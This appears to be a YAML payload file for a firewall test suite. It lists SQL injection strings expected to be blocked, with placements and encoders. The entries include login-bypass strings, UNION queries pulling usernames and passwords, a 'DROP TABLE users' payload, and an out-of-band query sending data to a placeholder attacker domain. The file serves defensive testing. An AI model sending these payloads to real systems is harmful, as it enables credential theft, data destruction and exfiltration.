suite: sqli
kind: attack
category: sqli
expected: blocked
severity: critical
description: "SQL Injection — Mikiri curated set"
references: ["CWE-89", "OWASP-A03:2021"]

default_placements: [url_query, header, cookie, body_urlencoded, body_json]
default_encoders:
  - [none]
  - [url]
  - [url_double]

payloads:
  - id: sqli-bool-0001
    raw: "1' OR '1'='1"
    tags: [boolean, classic]
  - id: sqli-bool-0002
    raw: "admin'--"
    tags: [comment, auth-bypass]
  - id: sqli-union-0003
    raw: "-1 UNION SELECT username,password FROM users-- -"
    tags: [union]
  - id: sqli-union-0004
    raw: "' UNION SELECT NULL,version(),NULL-- -"
    encoders:
      - [none]
      - [url]
      - [url_triple]
      - [base64]
    tags: [union, fingerprint]
  - id: sqli-time-0005
    raw: "1) AND SLEEP(5)-- -"
    tags: [time-based]
  - id: sqli-stacked-0006
    raw: "1; DROP TABLE users-- -"
    tags: [stacked]
  - id: sqli-err-0007
    raw: "' AND extractvalue(1,concat(0x7e,version()))-- -"
    tags: [error-based]
  - id: sqli-oob-0008
    raw: "1' AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\',version(),'.attacker.tld\\\\a')))-- -"
    tags: [oob]
  - id: sqli-ws-0009
    raw: "1' OR '1'='1'-- -"
    placements: [ws_message]
    encoders: [[none], [url]]
    tags: [websocket]
